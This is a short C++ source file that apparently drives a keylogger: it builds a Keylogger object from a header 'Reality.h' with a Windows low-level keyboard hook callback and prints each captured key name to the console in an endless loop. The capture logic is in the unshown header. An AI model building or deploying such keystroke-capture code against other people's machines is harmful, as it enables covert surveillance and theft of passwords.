#include "Reality.h"

#include <iostream>

int	main(int argc, char** argv) {
	std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) { std::cout << Keylogger::vkCodesAll[key->vkCode] << " "; };
	Keylogger kl(klCallback);

	while(true) {
		kl.Update();
	}

	return 0;
}